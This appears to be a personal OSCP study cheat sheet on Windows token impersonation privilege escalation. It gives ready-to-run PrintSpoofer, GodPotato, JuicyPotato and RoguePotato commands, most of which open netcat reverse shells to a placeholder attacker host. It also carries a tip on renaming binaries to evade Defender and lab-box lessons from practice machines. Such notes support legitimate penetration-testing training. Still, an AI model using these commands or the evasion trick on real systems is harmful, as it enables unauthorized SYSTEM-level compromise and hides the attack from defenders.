# Token Impersonation

Back to [[Windows-PrivEsc-Methodology]]

## Check Privileges
```cmd
whoami /priv
```

Requires **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** (common on service accounts, IIS, MSSQL).

## PrintSpoofer (try first)

Windows 10 / Server 2016-2019:
```cmd
.\PrintSpoofer64.exe -i -c cmd
```
```cmd
.\PrintSpoofer64.exe -c "C:\tmp\nc.exe ATTACKER_IP 443 -e cmd.exe"
```

## GodPotato (try second)

Works on newer Windows versions:
```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
```
```cmd
.\GodPotato.exe -cmd "cmd /c C:\tmp\nc.exe ATTACKER_IP 443 -e cmd.exe"
```

## JuicyPotatoNG (fallback)
```cmd
.\JuicyPotatoNG.exe -t * -p REDACTED -a "/c C:\tmp\nc.exe ATTACKER_IP 443 -e cmd.exe"
```

## SweetPotato
```cmd
.\SweetPotato.exe -e EfsRpc -p REDACTED -a "ATTACKER_IP 443 -e cmd.exe"
```

## Decision Order

1. PrintSpoofer -- simplest, try first
2. GodPotato -- broader Windows version support
3. JuicyPotatoNG -- fallback
4. SweetPotato -- alternative fallback

All require SeImpersonatePrivilege.

## When You'll See This

SeImpersonate is almost guaranteed when your shell came from:
- **IIS web application** (web shell, upload, SQLi to RCE)
- **MSSQL xp_cmdshell**
- **Any Windows service account**

This is one of the most common OSCP privesc paths. If you popped a web shell on Windows, check `whoami /priv` immediately - you probably have SeImpersonate.

## If Potato/PrintSpoofer Gets Caught by Defender

```cmd
# Try renaming
rename PrintSpoofer64.exe ps.exe
.\ps.exe -i -c cmd

# Or use a different binary - GodPotato is often less detected than PrintSpoofer
```

---

## From Your Boxes

> **Craft** (PG) - Apache service account had SeImpersonate + .NET 4 installed
> - What worked: `.\potato.exe -cmd ".\nc.exe ATTACKER_IP 8080 -e C:\Windows\System32\cmd.exe"` (GodPotato NET4)
> - Lesson: Match GodPotato version to installed .NET version. Check `dir C:\Windows\Microsoft.NET\Framework64\` for versions.

> **BillyBoss** (PG) - SeImpersonate on newer Windows; first GodPotato binary failed
> - What worked: Downloaded correct GodPotato release from GitHub, then `.\potato.exe -cmd "nc.exe IP PORT -e cmd.exe"`
> - Lesson: GodPotato has multiple release versions. If one fails, try a different release. Always have 2-3 versions ready.

> **Bounty** (HTB) - SeImpersonate on older Windows Server; used JuicyPotato
> - What worked: JuicyPotato with correct CLSID for Windows Server 2008 R2
> - Lesson: JuicyPotato needs the right CLSID for the target OS. Find CLSIDs at github.com/ohpe/juicy-potato/tree/master/CLSID.

> **Squid** (PG) - Service account had stripped privileges; FullPowers restored SeImpersonate, then PrintSpoofer
> - What worked: `FullPowers.exe` to restore privileges, then `.\printspoofer.exe -c "nc IP PORT -e powershell"`
> - Lesson: If SeImpersonate is missing on a service account, try FullPowers.exe first.

> **Trace** (VHL) - SeImpersonate found via whoami /priv
> - What worked: `.\printspoofer.exe -c "nc IP PORT -e powershell"`
> - Lesson: PrintSpoofer is the simplest potato attack. Try it first on Windows 10/Server 2019+.

> **AuthBy** (PG) - SeImpersonate on Windows Server 2008 R2; JuicyPotato x86 required
> - What worked: JuicyPotato with correct CLSID from the 2008 R2 Enterprise list
> - Lesson: Older OS = JuicyPotato. Newer OS = PrintSpoofer or GodPotato. Know which tool matches which OS.

> **Relia Host 249** (Course) - SeImpersonate; PrintSpoofer and GodPotato both timed out
> - What worked: RoguePotato with socat relay: `.\roguepotato.exe -r KALI_IP -e "nc.exe KALI_IP PORT -e powershell" -l 9999`
> - Lesson: If PrintSpoofer and GodPotato fail, try RoguePotato. It needs a relay (socat/ntlmrelayx) on your Kali box.

> **Relia Host 247** (Course) - SeImpersonate; all standard potatoes failed except RoguePotato
> - What worked: Same RoguePotato technique as Host 249
> - Lesson: Keep RoguePotato as a fallback. Some hardened environments block the simpler potato variants.

> **Skylark Host 225** (Course) - SeImpersonate on Windows target
> - What worked: `.\printspoofer.exe -c "nc.exe IP PORT -e powershell"`
> - Lesson: Transfer both nc.exe and PrintSpoofer together. They are a standard combo.

> **OSCP A - MS01** (Course) - SeImpersonate on MS01
> - What worked: `.\PrintSpoofer.exe -c "nc.exe IP PORT -e powershell"`
> - Lesson: PrintSpoofer works on most modern Windows. It should be your first attempt.
